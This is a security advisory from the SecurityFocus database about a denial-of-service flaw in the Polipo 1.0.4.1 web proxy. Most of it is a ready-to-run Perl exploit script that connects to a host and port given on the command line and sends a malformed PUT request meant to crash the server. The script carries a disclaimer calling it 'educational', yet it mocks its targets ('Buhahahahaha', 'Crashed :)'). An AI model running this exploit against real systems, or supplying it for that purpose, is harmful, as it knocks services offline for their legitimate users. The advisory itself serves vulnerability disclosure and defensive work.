source: http://www.securityfocus.com/bid/49908/info

Polipo is prone to a denial-of-service vulnerability.

Remote attackers can exploit this issue to cause the application to crash, denying service to legitimate users.

Polipo 1.0.4.1 is vulnerable; other versions may also be affected. 

#!/usr/bin/perl
# POLIPO 1.0.4.1 Denial Of Service
# Disclaimer:
# [This code is for Educational Purposes , I would Not be responsible
for any misuse of this code]
# Author: Usman Saeed
# Company: Xc0re Security Research Group
# Website: http://www.xc0re.net
# DATE: [30/09/11]

$host = $ARGV[0];
$PORT = $ARGV[1];


$evil = "PUT / HTTP/1.1\r\n".
"Content-Length:1\r\n\r\n";


use IO::Socket::INET;
if (! defined $ARGV[0])
{
print "+========================================================+\n";
print "+ Program [POLIPO 1.0.4.1 Denial Of Service]             +\n";
print "+ Author [Usman Saeed]                                   +\n";
print "+ Company [Xc0re Security Research Group]                +\n";
print "+ DATE: [30/09/11]                                       +\n";
print "+ Usage :perl sploit.pl webserversip wbsvrport           +\n";
print "+ Disclaimer: [This code is for Educational Purposes ,   +\n";
print "+ I would Not be responsible for any misuse of this code]+\n";
print "+========================================================+\n";





exit;
}


$sock = IO::Socket::INET->new( Proto => "tcp",PeerAddr  => $host ,
PeerPort  => $PORT) || die "Cant connect to $host!";
print "+========================================================+\n";
print "+ Program [POLIPO 1.0.4.1 Denial Of Service]             +\n";
print "+ Author [Usman Saeed]                                   +\n";
print "+ Company [Xc0re Security Research Group]                +\n";
print "+ DATE: [30/09/11]                                       +\n";
print "+ Usage :perl sploit.pl webserversip wbsvrport           +\n";
print "+ Disclaimer: [This code is for Educational Purposes ,   +\n";
print "+ I would Not be responsible for any misuse of this code]+\n";
print "+========================================================+\n";





print "\n";

print "[*] Initializing\n";

sleep(2);

print "[*] Sendin evil Packet Buhahahahaha \n";

send ($sock , $evil , 0);
print "[*] Crashed :) \n";
$res = recv($sock,$response,1024,0);
print $response;



exit;